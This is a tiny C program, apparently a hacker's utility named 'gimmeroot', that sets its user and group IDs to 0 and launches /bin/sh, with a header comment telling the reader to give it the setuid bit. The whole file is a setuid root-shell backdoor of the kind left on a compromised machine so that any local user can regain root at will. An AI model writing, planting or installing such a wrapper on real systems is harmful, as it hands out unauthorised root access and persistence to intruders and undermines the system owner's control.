/*
* by h15h4m
* DO NOT FORGET TO CHMOD TO A STICKY PERM
* chmod +s gimmeroot
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void main() {
	printf("[+] setuid executing...\n");
	
	setuid(0);
	setgid(0);

	execve("/bin/sh", NULL, NULL);
}
